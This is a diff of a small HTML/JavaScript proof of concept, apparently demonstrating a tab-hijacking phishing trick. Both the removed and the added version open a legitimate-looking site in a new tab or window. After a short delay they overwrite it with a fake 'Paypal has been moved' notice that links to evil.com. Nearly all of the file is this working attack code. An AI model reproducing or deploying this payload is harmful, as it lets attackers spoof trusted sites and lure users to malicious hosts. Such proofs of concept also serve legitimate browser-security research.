@@ -1,33 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Tap to Hijack Legit Tab</title>
-  <script>
-    let tabRef;
-
-    function pwned(tab) {
-      if (tab && !tab.closed) {
-        tab.document.write(`<h1>⚠️ Paypal has been moved</h1><p><a href="https://evil.com">Click here to proceed</a></p>`);
-        tab.document.close();
-      } else {
-        alert("Popup blocked or tab closed");
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', function () {
-      document.body.addEventListener('touchstart', function handler(e) {
-        document.body.removeEventListener('touchstart', handler);
-
-        // Step 1: open real site immediately (this avoids popup block)
-        tabRef = window.open('https://legitsite.com', '_blank');
-
-        // Step 2: hijack content after short delay
-        setTimeout(() => pwned(tabRef), 1500); // Delay allows real site to load before hijack
-      }, { once: true });
-    });
-  </script>
-</head>
-<body>
-  <h1 style="text-align:center; margin-top:100px;">📱 Tap anywhere to begin</h1>
-</body>
-</html>
+<script>
+function pwned() {
+var t = window.open('', 'ss');
+t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
+t.stop();
+}
+</script>
+<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
